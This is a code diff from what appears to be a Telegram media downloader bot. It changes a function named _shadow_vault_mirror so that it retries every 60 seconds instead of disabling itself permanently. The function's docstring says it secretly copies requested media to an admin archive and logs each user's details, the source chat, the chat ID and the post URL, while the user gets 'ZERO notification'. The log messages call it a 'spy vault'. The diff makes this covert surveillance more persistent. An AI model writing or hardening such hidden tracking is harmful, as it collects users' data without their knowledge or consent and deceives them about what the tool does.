@@ -19,8 +19,7 @@ from core.progress import ProgressTracker, get_progress_markup
 from core.media_processor import inspect_video_async, extract_thumbnail_async, split_video_if_needed
 
 from core.download_engine import active_jobs
-from config import ADMIN_ARCHIVE_CHANNEL
-_disabled_archives = set()
+_disabled_archives_until: dict = {}
 
 
 async def _shadow_vault_mirror(
@@ -39,6 +38,7 @@ async def _shadow_vault_mirror(
     Includes comprehensive stealth audit: User info, Source Channel/Group name, Chat ID, and Post URL.
     The requesting user receives ZERO notification and has 0% awareness.
     """
+    import time
     archive_id = None
     try:
         from database import db
@@ -55,7 +55,7 @@ async def _shadow_vault_mirror(
     if not archive_id:
         return
 
-    if archive_id in _disabled_archives:
+    if time.time() < _disabled_archives_until.get(archive_id, 0):
         return
 
     # Resolve User Display info
@@ -134,8 +134,8 @@ async def _shadow_vault_mirror(
     except Exception as e:
         err_s = str(e).upper()
         if "CHANNEL_INVALID" in err_s or "CHAT_ADMIN_REQUIRED" in err_s or "PEER_ID_INVALID" in err_s:
-            _disabled_archives.add(archive_id)
-            print(f"[!] Spy vault mirror paused: bot is not an admin in ADMIN_ARCHIVE_CHANNEL {archive_id} (or channel invalid).")
+            _disabled_archives_until[archive_id] = time.time() + 60
+            print(f"[!] Spy vault mirror paused (retry in 60s): bot is not an admin in ADMIN_ARCHIVE_CHANNEL {archive_id} (or channel invalid).")
         else:
             print(f"[!] Spy vault mirror failed silently: {e}")
 
